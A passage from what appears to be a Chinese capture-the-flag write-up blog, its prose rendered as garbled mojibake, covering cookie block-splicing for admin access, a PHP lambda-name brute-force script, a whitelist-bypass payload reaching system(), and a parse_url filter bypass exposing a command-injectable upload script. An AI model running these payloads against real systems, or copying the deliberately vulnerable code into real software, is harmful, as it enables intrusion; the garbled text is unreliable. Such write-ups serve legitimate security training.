<p>åœ¨å“åº”é‡Œé¢æœ‰ä¸€ä¸ªuserçš„cookieå­—æ®µï¼Œä¿®æ”¹ä¸€ä¸‹æœ‰æŠ¥é”™ï¼Œæ”¹ä¸¤æ¬¡ï¼ŒæŠ¥é”™æ‹¼å‡‘å‡ºå®Œæ•´çš„å½¢å¼</p>
<img src="/2020/07/04/taoismt/13.png" class="">

<img src="/2020/07/04/taoismt/14.png" class="">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;123&quot;,&quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿›è¡Œäº†16è¿›åˆ¶ç¼–ç çš„è½¬æ¢ï¼Œçœ‹äº†ä¸€ä¸‹cookieé•¿åº¦æ˜¯160ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯5ä¸ªç‰‡æ®µï¼Œæ¯ä¸ª32ä½</p>
<p>è¿™é‡Œå¯ä»¥ç”¨æ‹¼æ¥æ¥æ„é€ æƒ³è¦çš„å†…å®¹</p>
<p>æ—¢ç„¶è¦is_adminçš„å€¼ä¸º1ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨æµ®ç‚¹æ•°ï¼Œæ³¨å†Œè´¦å·åä¸ºA1.00000000000000ï¼Œå¯†ç ä¸ºå››ä½æ•°ï¼Œé‚£ä¹ˆç‰‡æ®µä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.&#123;&quot;first_name&quot;:&quot;A</span><br><span class="line">2.1.00000000000000</span><br><span class="line">3.&quot;,&quot;last_name&quot;:&quot;x&quot;</span><br><span class="line">4.xxx&quot;,&quot;is_admin&quot;:</span><br><span class="line">5.0&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">'3e19f158a5ca37e168f8f211730e4443f712bf0bf7fc57699fda6d088e92c3269acbde72eef37640f1163e3bb9340bfa18119ee988184cf761924328f8ffb114719c0e3ec06178e9b71ab915fc0719b9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=s[:<span class="number">-32</span>]+s[<span class="number">32</span>:<span class="number">64</span>]+s[<span class="number">-32</span>:]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">'3e19f158a5ca37e168f8f211730e4443f712bf0bf7fc57699fda6d088e92c3269acbde72eef37640f1163e3bb9340bfa18119ee988184cf761924328f8ffb114f712bf0bf7fc57699fda6d088e92c326719c0e3ec06178e9b71ab915fc0719b9'</span></span><br></pre></td></tr></table></figure>

<p>å°†æ–°ç”Ÿæˆçš„cookieå€¼è¿›è¡Œæ›¿æ¢å°±èƒ½ä»¥ç®¡ç†å‘˜çš„èº«ä»½ç™»å½•ï¼Œæ‹¿åˆ°flag</p>
<img src="/2020/07/04/taoismt/15.png" class="">

<h3 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h3><p>ä¸Šæ¥ç›´æ¥ç»™äº†æºç ï¼Œç¨å¾®æ•´ç†ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line">$MY = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'cat flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"functin SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">	$_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>ä»æºç å°±å¯ä»¥çœ‹å‡ºåªè¦èƒ½å¤Ÿè®©$MYçš„å‡½æ•°èƒ½å¤Ÿæ‰§è¡Œå°±å¯ä»¥æ‹¿åˆ°flag</p>
<p>æŸ¥äº†ä¸€ä¸‹,create_function()æ–¹æ³•ç”Ÿæˆçš„å‡½æ•°æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°</p>
<img src="/2020/07/04/taoismt/16.png" class="">

<p>å¹¶ä¸”è¿™ä¸ªåŒ¿åå‡½æ•°çš„æ ¼å¼è¿˜æ˜¯å›ºå®šçš„ï¼š%00lambda_%d,ç»è¿‡æœ¬åœ°æµ‹è¯•ç¡®å®åªæœ‰%dä¼šæ”¹å˜</p>
<img src="/2020/07/04/taoismt/17.png" class="">

<p>ä¸‹é¢å°±ç›´æ¥ä¸Šexpå§ï¼Œæš´åŠ›ç®€å•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(1000):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;46760534-c292-46ff-bdfa-7d0c850c9364.node3.buuoj.cn&#x2F;?func_name&#x3D;%00lambda_&#123;&#125;&#39;.format(i)</span><br><span class="line">    s &#x3D; requests.get(url)</span><br><span class="line">    print(s.text)</span><br></pre></td></tr></table></figure>

<img src="/2020/07/04/taoismt/18.png" class="">

<p>åŠåˆ†é’Ÿä¸åˆ°çš„æ—¶é—´å°±èƒ½è·‘å‡ºæ¥äº†ï¼Œå¦‚æœæ‹…å¿ƒè®¿é—®è¿‡å¿«å°±åŠ ä¸ªsleep</p>
<h3 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h3><p>ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™ç»•è¿‡äº†\tç­‰è®¸å¤šå­—ç¬¦ï¼Œè¿™é‡Œè¦ç”¨åˆ°çš„æ˜¯æ•°å­¦å‡½æ•°æ„é€ RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPå‡½æ•°ï¼š</span><br><span class="line"></span><br><span class="line">scandir() å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line">base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚</span><br><span class="line">dechex() å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚</span><br><span class="line">hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</span><br><span class="line">var_dump() ï¼šå‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚</span><br><span class="line">readfile() å‡½æ•°ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚æ‚¨å¯ä»¥é€šè¿‡ @readfile() å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;&lt;command&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™ä¸ªpayloadé•¿åº¦è¿‡é•¿æ— æ³•ä½¿ç”¨</p>
<p>æœ€å¥½ç”¨ç™½åå•ä¸­èƒ½ç”¨çš„å‡½æ•°æ¥æ„é€ ï¼Œä¸‹é¢æ˜¯exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload =[<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è·‘å‡ºçš„ç»“æœä¸­å»æ‰¾èƒ½å¤Ÿè¿æˆ_GETç­‰ï¼Œå°±å¯ä»¥äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;ls%20&#x2F;</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢æ ¹ç›®å½•èƒ½å¤Ÿçœ‹åˆ°flagæ–‡ä»¶ï¼Œè¯»å–ä¸€ä¸‹æ‹¿åˆ°flag</p>
<h3 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h3><p>æ‰“å¼€æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯ç›´æ¥æ³¨å…¥ï¼Œåæ¥å‘ç°ä¸å¯¹ï¼Œè¯•äº†ä¸€ä¸‹æœ‰æ³¨å†Œé¡µé¢ï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•</p>
<img src="/2020/07/04/taoismt/19.png" class="">

<p>çœ‹åˆ°urlçš„æ ¼å¼ï¼Œä¸æ˜¯æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯åº”è¯¥å¯ä»¥ç”¨phpä¼ªåè®®è¯»ä¸€ä¸‹æºç </p>
<p>è´´ä¸€ä¸‹function.phpçš„ï¼Œuser.phpå’Œguest.phpæ²¡å•¥å¤ªæœ‰ç”¨çš„ä¿¡æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">"Location: hacker.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>,<span class="string">"info"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $blacklist = <span class="string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span>;</span><br><span class="line">    $whitelist = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+&gt;&lt;"</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($string); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="string">"$whitelist"</span>, $string[$i]) === <span class="keyword">false</span>) &#123;</span><br><span class="line">            Hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/is"</span>, $string)) &#123;</span><br><span class="line">        Hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $mysqli-&gt;real_escape_string($string);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span><span class="params">($sql_query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($user, $pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        $data = $res-&gt;fetch_array();</span><br><span class="line">        $_SESSION[<span class="string">'user'</span>] = $data[username_which_you_do_not_know];</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">        $_SESSION[<span class="string">'isadmin'</span>] = $data[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span><span class="params">($level,$user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql = <span class="string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' "</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> ($res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($user, $pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')"</span>;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line">    <span class="keyword">return</span> $mysqli-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    Header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>blacklisté‡Œçš„ä¸œè¥¿banæ‰äº†sqlæ³¨å…¥çš„æƒ³æ³•ï¼Œåœ¨$keywordsæ•°ç»„ä¸­æœ‰ç‚¹ä¸œè¥¿ï¼Œè¯•è¯•è¯»å–ä¸€ä¸‹ï¼Œè¿™é‡Œæ³¨æ„åˆ°äº†parse_url()ï¼Œç”¨urlé”™è¯¯è§£æè¿”å›falseå°±èƒ½ç»•è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ffffllllaaaaggg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you can find sth in m4aaannngggeee"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿç€æç¤ºæ¥ç€è®¿é—®m4aaannngggeee</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#m4aaannngggeee.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you can not visit it directly"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"templates/upload.html"</span>;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/04/taoismt/20.png" class="">

<p>ä»¥ä¸ºæ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯æ˜¯ä¸ªå‡çš„ï¼Œæ¥è¯»å–ä¸€ä¸‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload fileÃ¯Â¼Â"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>.$filename.<span class="string">" | base64 -w 0"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/png;base64,"</span>.$picdata.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

